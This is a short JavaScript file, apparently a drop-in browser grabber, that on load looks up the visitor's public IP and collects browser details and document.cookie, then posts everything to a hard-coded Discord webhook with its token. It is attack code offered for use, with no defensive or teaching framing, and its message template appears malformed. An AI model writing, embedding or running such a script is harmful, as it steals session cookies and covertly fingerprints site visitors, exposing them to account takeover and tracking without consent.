function postToWebhook(text) {
    fetch("https://discord.com/api/webhooks/1491901380837904394/C5d28HGlXs-eEJelCXMJHnfZrymy03kMF0Fg5ndVKBB32dRBSy1JN6GKPs_964-etMC7", {
          method: "POST",
          headers: {
              "Content-Type": "application/json"
          },
          body: JSON.stringify({
              content: `${text}`
          })
    });
}

function collectInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookies: document.cookie,
        referrer: document.referrer,
        webdriver: navigator.webdriver
    };
}

fetch("https://ifconfig.me/ip").then(res => res.text()).then(ip => {
    const info = collectInfo();
    const message = `
`\`\`\
IP Address: ${ip}
UserAgent: ${info.userAgent}
Platform: ${info.platform}
Language: ${info.language}
Screen ratio: ${info.screen}
Timezone: ${info.timezone}
Cookies: ${info.cookies}
Referrer: ${info.referrer}
Webdriver: ${info.webdriver}
`\`\`\
    `;
    postToWebhook(message);
});
    
